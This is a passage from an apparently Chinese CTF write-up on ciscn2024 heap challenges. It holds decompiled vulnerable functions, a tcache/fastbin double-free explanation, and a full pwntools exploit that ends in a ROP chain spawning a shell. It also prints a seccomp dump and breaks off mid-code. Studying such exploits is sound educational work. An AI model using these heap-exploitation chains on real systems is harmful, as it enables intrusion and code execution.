function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">msg = c_pb2.Devicemsg()</span><br><span class="line">msg.whatcon = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">msg.whattodo = <span class="number">2</span></span><br><span class="line">msg.whatidx = idx</span><br><span class="line">msg.whatsize = <span class="number">1</span></span><br><span class="line">msg.whatthis = <span class="number">2</span></span><br><span class="line">sa(<span class="string">b&#x27;WHAT DO YOU WANT?\n&#x27;</span>,msg.SerializeToString())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">msg = c_pb2.Devicemsg()</span><br><span class="line">msg.whatcon = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">msg.whattodo = <span class="number">3</span></span><br><span class="line">msg.whatidx = idx</span><br><span class="line">msg.whatsize = <span class="number">0</span></span><br><span class="line">msg.whatthis = <span class="number">0</span></span><br><span class="line">sa(<span class="string">b&#x27;WHAT DO YOU WANT?\n&#x27;</span>,msg.SerializeToString())</span><br></pre></td></tr></table></figure><p>这道题目有点意思,比赛的时候一直被show函数中的两个分支给迷惑了,一直在想这两个分支有什么用,最后结论是没软用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">show</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> idx, <span class="type">int</span> this, __int64 size, __int64 a4, <span class="type">char</span> *content)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> delim; <span class="comment">// [rsp+33h] [rbp-1Dh] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v9; <span class="comment">// [rsp+34h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">char</span> *v10; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  <span class="type">char</span> v11[<span class="number">15</span>]; <span class="comment">// [rsp+41h] [rbp-Fh] BYREF</span></span><br><span class="line"></span><br><span class="line">  *(_QWORD *)&amp;v11[<span class="number">7</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v9 = idx;</span><br><span class="line">  delim = this;</span><br><span class="line">  <span class="built_in">strcpy</span>(v11, <span class="string">&quot;hahaha&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( idx &lt;= <span class="number">8</span> &amp;&amp; ptr_qword_C0A0[v9] )</span><br><span class="line">    v10 = (<span class="type">char</span> *)ptr_qword_C0A0[v9];</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v10 = v11;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Content:&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( this == <span class="string">&#x27;\xFF&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    seccomp_load(qword_C328);</span><br><span class="line">    strtok(content, &amp;delim);</span><br><span class="line">    v10 = strtok(<span class="number">0LL</span>, &amp;delim);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="string">&#x27;0&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    strtok(buf, &amp;delim);</span><br><span class="line">    v10 = strtok(<span class="number">0LL</span>, &amp;delim);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, v10);</span><br><span class="line">  <span class="built_in">free</span>(buf);</span><br><span class="line">  <span class="keyword">if</span> ( ++dword_C084 == <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    close(<span class="number">1</span>);</span><br><span class="line">    close(<span class="number">2</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> *(_QWORD *)&amp;v11[<span class="number">7</span>] - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>add函数,能够申请9个note</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *__fastcall <span class="title function_">add</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> a1, __int64 a2, <span class="type">const</span> <span class="type">void</span> *a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v5 = a1;</span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">8</span> )</span><br><span class="line">    v5 = <span class="number">8</span>;</span><br><span class="line">  *((_QWORD *)&amp;ptr_qword_C0A0 + v5) = <span class="built_in">malloc</span>(<span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">memcpy</span>(*((<span class="type">void</span> **)&amp;ptr_qword_C0A0 + v5), a3, <span class="number">0x30</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>delete函数存在指针悬空</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">delete</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)fnum_dword_C080 &gt; <span class="number">9</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;No chance!&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">8</span> || !*((_QWORD *)&amp;ptr_qword_C0A0 + a1) )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;OOPS!&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(*((<span class="type">void</span> **)&amp;ptr_qword_C0A0 + a1));</span><br><span class="line">  <span class="keyword">return</span> ++fnum_dword_C080;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意到初始化函数中,有初始化一套沙盒规则,但是只有在show中的一个分支会加载</p><p>完全可以避免,并且在初始化沙盒的过程中,堆布局被打乱了,不过这有一个好处就是初始的时候unsorted中就已经是有chunk的</p><p>然后protobuf过程会申请chunk,特别是content的内容位于一个独立的chunk,控制其大小就可以控制申请任意大小chunk</p><p>这样在add的时候memcpy就会将chunk上的残留的libc一起复制过来,然后只要填充8个字节就能泄露libc,至于泄露heap就更简单了</p><p>接着我们考虑如何做到任意写,show函数在调用完两次之后就不建议使用了,因为第三次使用就会加载沙盒,而我们也没有必须再一次泄露的必要</p><p>delete允许我们最多使用10次,首先想到的就是构造doublefree</p><p>这里有两种思路</p><ol><li>填满tcache,释放victim到fastbin,在取出一个.再释放victim进入tcache,不过这种方式在是行不通的,因为之后取出的时候必然会先取出tcache中的,那么之后取出fastbin中的时候除非找到刚好的fakechunk,否则就会触发错误</li><li>第二种方式,即完全利用fastbin进行double free,填满tcache后释放一次victim,释放一个正常chunk防止fast的doublefree检查,然后再释放victim</li></ol><p>采用第二种方法后就成功在fastbin中构造doublefree了,现在又面临一个问题,劫持fastbin时依然会受到fastbin的size检查影响</p><p>但其实完全不用担心这个问题,因为再引入tcache之后,就增加了一个机制,即从fastbin或smallbin中取出chunk时,如果对应tcache中有空余就将链中的chunk移动到tcache中</p><p>所以在我们第一次取出victim的时候,剩下的fastbin中chunk就已经移动到tcache中了,那也就没有那些检查了</p><p>ok,接下来考虑如何利用,我们的劫持的tcache链大小只有0x40,能写的只有0x30,下一步应该如何走</p><p>如果只有一次劫持机会,想要在这一次就完成利用几乎是不可能的,所以我们希望能够多几次劫持</p><p>最直接的一个思路就是劫持tcache结构体,但因为0x30太小了,不能在覆盖count的同时覆盖entry</p><p>所以选择二次劫持tcache结构体</p><p>注意到此时tcache如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bin</span><br><span class="line">tcachebins</span><br><span class="line">0x40 [  3]: 0x55f93cabb100 —▸ 0x55f93cabae40 —▸ 0x55f93cab60f0 ◂— 0x55f93cab6</span><br><span class="line">0xd0 [  7]: 0x55f93cab77d0 —▸ 0x55f93cab74a0 —▸ 0x55f93cab7170 —▸ 0x55f93cab6e40 —▸ 0x55f93cab6b10 —▸ 0x55f93cab67e0 —▸ 0x55f93cab6350 ◂— 0x0</span><br><span class="line">0xf0 [  1]: 0x55f93cab9260 ◂— 0x0</span><br></pre></td></tr></table></figure><p>我们先劫持0xf0的chunk,使其指向tcache结构体的开头,再靠protobuf的任意chunk申请进行写操作</p><p>然后这时候就能够比较自由的任意写了,现在的话主要是两种主流的方法泄露stack劫持rop<u>或者</u>fsop</p><p>如果选择fsop就不需要再进行泄露了,不过因为这题无法main函数返回或者exit退出,所以只能通过printf进行fsop,一些模板的偏移可能需要进行一些调整</p><p>rop的话则还需要一次泄露栈地址,但不能使用show函数,那还能怎样泄露?自然是<code>_IO_2_1_stdout_</code>结构体</p><p>这一部分没啥好说的,注意调试就是了</p><p>采用<u>rop</u>方法的exp如下</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> c_pb2</span><br><span class="line"></span><br><span class="line">elf_path=<span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(elf_path,checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">context.binary=elf_path</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">ra  =<span class="keyword">lambda</span> time=<span class="number">0.5</span>:p.recvall(timeout=time)</span><br><span class="line">u7f =<span class="keyword">lambda</span>:u64(ru(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">0x8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> name,addr :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">script = <span class="number">0</span></span>):</span><br><span class="line"><span class="keyword">if</span>(script):</span><br><span class="line">gdb.attach(p, script)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">local=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line"><span class="keyword">if</span>(local):</span><br><span class="line"><span class="keyword">return</span> process(elf_path)</span><br><span class="line"><span class="keyword">return</span> remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">1234</span>)</span><br><span class="line"></span><br><span class="line">p=run()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,content=<span class="string">b&#x27;&#x27;</span></span>):</span><br><span class="line">msg = c_pb2.Devicemsg()</span><br><span class="line">msg.whatcon = content</span><br><span class="line">msg.whattodo = <span class="number">1</span></span><br><span class="line">msg.whatidx = idx</span><br><span class="line">msg.whatsize = <span class="number">0</span></span><br><span class="line">msg.whatthis = <span class="number">0</span></span><br><span class="line">sa(<span class="string">b&#x27;WHAT DO YOU WANT?\n&#x27;</span>,msg.SerializeToString())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">msg = c_pb2.Devicemsg()</span><br><span class="line">msg.whatcon = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">msg.whattodo = <span class="number">2</span></span><br><span class="line">msg.whatidx = idx</span><br><span class="line">msg.whatsize = <span class="number">1</span></span><br><span class="line">msg.whatthis = <span class="number">2</span></span><br><span class="line">sa(<span class="string">b&#x27;WHAT DO YOU WANT?\n&#x27;</span>,msg.SerializeToString())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">msg = c_pb2.Devicemsg()</span><br><span class="line">msg.whatcon = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">msg.whattodo = <span class="number">3</span></span><br><span class="line">msg.whatidx = idx</span><br><span class="line">msg.whatsize = <span class="number">0</span></span><br><span class="line">msg.whatthis = <span class="number">0</span></span><br><span class="line">sa(<span class="string">b&#x27;WHAT DO YOU WANT?\n&#x27;</span>,msg.SerializeToString())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">content</span>):</span><br><span class="line">msg = c_pb2.Devicemsg()</span><br><span class="line">msg.whatcon = content</span><br><span class="line">msg.whattodo = <span class="number">0</span></span><br><span class="line">msg.whatidx = <span class="number">0</span></span><br><span class="line">msg.whatsize = <span class="number">0</span></span><br><span class="line">msg.whatthis = <span class="number">0</span></span><br><span class="line">sa(<span class="string">b&#x27;WHAT DO YOU WANT?\n&#x27;</span>,msg.SerializeToString())</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">add(i,<span class="string">b&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc.address = u7f() - <span class="number">0x219ce0</span> - <span class="number">0x1000</span></span><br><span class="line"></span><br><span class="line">leak(<span class="string">&#x27;libc&#x27;</span>,libc.address)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content:&quot;</span>)</span><br><span class="line">heap = u64(p.recv(<span class="number">5</span>).ljust(<span class="number">0x8</span>,<span class="string">b&quot;\x00&quot;</span>)) * <span class="number">0x1000</span> - <span class="number">0x2000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">delete(i+<span class="number">1</span>) </span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    delete(i+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i,<span class="string">b&quot;A&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">environ = libc.sym[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line">stdout = libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(environ))</span><br><span class="line">stdout=libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>,p64((heap+<span class="number">0xf0</span>) ^((heap+<span class="number">0x4e40</span>)&gt;&gt;<span class="number">12</span>)))</span><br><span class="line">add(<span class="number">8</span>,<span class="string">b&quot;AAAAAA&quot;</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="string">b&quot;A&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>,p64(<span class="number">0</span>)+p64(heap+<span class="number">0x10</span>))</span><br><span class="line">fill((((p16(<span class="number">0</span>)*<span class="number">2</span>+p16(<span class="number">1</span>)+p16(<span class="number">1</span>)).ljust(<span class="number">0x10</span>,<span class="string">b&quot;\x00&quot;</span>)+p16(<span class="number">1</span>)+p16(<span class="number">1</span>)).ljust(<span class="number">0x90</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(stdout)+p64(stdout)+p64(<span class="number">0</span>)*<span class="number">5</span>+p64(heap+<span class="number">0x10</span>)).ljust(<span class="number">0xe0</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">fill(p64(<span class="number">0xFBAD1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(environ)+p64(environ+<span class="number">8</span>))</span><br><span class="line">stack = u7f() - <span class="number">0x1a8</span> + <span class="number">0x40</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack))</span><br><span class="line">fill((((p16(<span class="number">0</span>)*<span class="number">2</span>+p16(<span class="number">0</span>)+p16(<span class="number">0</span>)+p16(<span class="number">1</span>)).ljust(<span class="number">0x10</span>,<span class="string">b&quot;\x00&quot;</span>)+p16(<span class="number">1</span>)+p16(<span class="number">1</span>)).ljust(<span class="number">0x90</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(stack)).ljust(<span class="number">0xa0</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x000000000002a3e5</span> + libc.address</span><br><span class="line">system = libc.sym[<span class="string">&#x27;system&#x27;</span>] </span><br><span class="line">binsh = <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">ret = <span class="number">0x000000000002a3e6</span> + libc.address</span><br><span class="line"></span><br><span class="line">fill((p64(ret)*<span class="number">2</span>+p64(pop_rdi)+p64(binsh)+p64(system)).ljust(<span class="number">0x58</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line"></span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><h2 id="ciscn2024-SuperHeap"><a href="#ciscn2024-SuperHeap" class="headerlink" title="ciscn2024-SuperHeap"></a>ciscn2024-SuperHeap</h2><p>第二天的第一道题,是可恶的cgo,建议用ida8.3这样的话不需要人工恢复符号</p><p>有沙盒,seccomp-tools能够dump出来,看样子是要orw</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">seccomp-tools dump ./SuperHeap </span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = <span class="built_in">arch</span></span><br><span class="line"> 0001: 0x15 0x00 0x0d 0xc000003e  <span class="keyword">if</span> (A != ARCH_X86_64) goto 0015</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  <span class="keyword">if</span> (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x0a 0xffffffff  <span class="keyword">if</span> (A != 0xffffffff) goto 0015</span><br><span class="line"> 0005: 0x15 0x08 0x00 0x00000029  <span class="keyword">if</span> (A == socket) goto 0014</span><br><span class="line"> 0006: 0x15 0x07 0x00 0x0000002a  <span class="keyword">if</span> (A == connect) goto 0014</span><br><span class="line"> 0007: 0x15 0x06 0x00 0x00000031  <span class="keyword">if</span> (A == <span class="built_in">bind</span>) goto 0014</span><br><span class="line"> 0008: 0x15 0x05 0x00 0x00000032  <span class="keyword">if</span> (A == listen) goto 0014</span><br><span class="line"> 0009: 0x15 0x04 0x00 0x00000038  <span class="keyword">if</span> (A == <span class="built_in">clone</span>) goto 0014</span><br><span class="line"> 0010: 0x15 0x03 0x00 0x0000003b  <span class="keyword">if</span> (A == execve) goto 0014</span><br><span class="line"> 0011: 0x15 0x02 0x00 0x00000065  <span class="keyword">if</span> (A == ptrace) goto 0014</span><br><span class="line"> 0012: 0x15 0x01 0x00 0x000000a5  <span class="keyword">if</span> (A == mount) goto 0014</span><br><span class="line"> 0013: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0014: 0x06 0x00 0x00 0x00050001  <span class="built_in">return</span> ERRNO(1)</span><br><span class="line"> 0015: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br></pre></td></tr></table></figure><p>然后这题因为是golang的题目,可以直接用之前提到过的pbtk工具提取出proto文件</p><p>add以及edit需要使用protobuf交互,并且还进行性了base64/32编码,先对message每一个字段进行b64编码,再protobuf序列化,最后b32编码</p><p>漏洞是出现在edit中,memmove没有检查大小</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( len &lt; <span class="number">0x40000000</span> )</span><br><span class="line">  v49 = len;</span><br><span class="line"><span class="keyword">if</span> ( v62 != *(uint8 **)v48 )</span><br><span class="line">&#123;</span><br><span class="line">  runtime_memmove(*(_QWORD *)v48, v62, v49);</span><br><span class="line">  v83<span class="number">.0</span>.ptr = v63;</span><br><span class="line">  v48 = v67;</span><br><span class="line">&#125;</span><br><span class="line">v50 = <span class="number">0x40000000</span>LL;</span><br><span class="line"><span class="keyword">if</span> ( v60 &lt; <span class="number">0x40000000</span> )</span><br><span class="line">  v50 = v60;</span><br><span class="line"><span class="keyword">if</span> ( v65 != *(uint8 **)(v48 + <span class="number">8</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  runtime_memmove(*(_QWORD *)(v48 + <span class="number">8</span>), v65, v50);</span><br><span class="line">  v83<span class="number">.0</span>.ptr = v63;</span><br><span class="line">  v48 = v67;</span><br><span class="line">&#125;</span><br><span class="line">v51 = <span class="number">0x40000000</span>LL;</span><br><span class="line"><span class="keyword">if</span> ( v59 &lt; <span class="number">0x40000000</span> )</span><br><span class="line">  v51 = v59;</span><br><span class="line">v52 = (<span class="type">int</span>)v64;</span><br><span class="line"><span class="keyword">if</span> ( v64 != *(uint8 **)(v48 + <span class="number">16</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  runtime_memmove(*(_QWORD *)(v48 + <span class="number">16</span>), v64, v51);</span><br><span class="line">  v83<span class="number">.0</span>.ptr = v63;</span><br><span class="line">  v48 = v67;</span><br><span class="line">&#125;</span><br><span class="line">v53 = <span class="number">0x40000000</span>LL;</span><br><span class="line"><span class="keyword">if</span> ( (__int64)v83<span class="number">.0</span>.len &lt; <span class="number">0x40000000</span> )</span><br><span class="line">  v53 = v83<span class="number">.0</span>.len;</span><br><span class="line"><span class="keyword">if</span> ( v83<span class="number">.0</span>.ptr != *(uint8 **)(v48 + <span class="number">24</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  runtime_memmove(*(_QWORD *)(v48 + <span class="number">24</span>), v83<span class="number">.0</span>.ptr, v53);</span><br><span class="line">  v48 = v67;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个库函数的声明如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span 